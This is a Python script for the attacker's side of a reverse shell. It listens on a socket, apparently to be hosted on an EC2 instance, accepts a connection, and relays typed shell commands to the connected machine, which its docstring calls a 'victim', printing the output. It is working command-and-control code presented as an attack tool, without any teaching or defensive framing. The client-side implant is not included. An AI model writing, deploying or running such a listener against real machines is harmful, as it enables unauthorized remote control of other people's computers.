# this file is going to be hosted on AWS EC2 instance

import socket
import sys


class Server:

    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 9999
        self.skt = None

    def create_socket(self):
        try:
            self.skt = socket.socket()
            print('Created socket successfully.')
        except socket.error as err:
            print("Socket creation error.", str(err))

    def bind_socket(self):
        try:
            self.skt.bind((self.host, self.port))
            print('Socket binded to {}:{}'.format(self.host, self.port))
        except socket.error as err:
            print("Socket binding error.", str(err))

    def listen_connection(self):
        try:
            # retry for the maximum times of 5
            self.skt.listen(5)
            print('Listening to connection requests...')
        except socket.error as err:
            print('Error while listening to the connection.', str(err))

    def start(self):
        self.create_socket()
        self.bind_socket()
        self.listen_connection()
        self.accept()

    def accept(self):
        connection, addresses = self.skt.accept()
        print('Connection established with {} on port {}'.format(
            addresses[0], addresses[1]))
        self.send_commands(connection)
        connection.close()

    def send_commands(self, connection):
        '''Sends shell commands to a victim'''
        while True:
            command = input()
            if command == 'quit':
                connection.close()
                self.skt.close()
                sys.exit()
            message = str.encode(command)
            if len(message) > 0:
                connection.send(message)
                response = str(connection.recv(1024), 'utf-8')
                print(response, end=" ")


server = Server()
server.start()
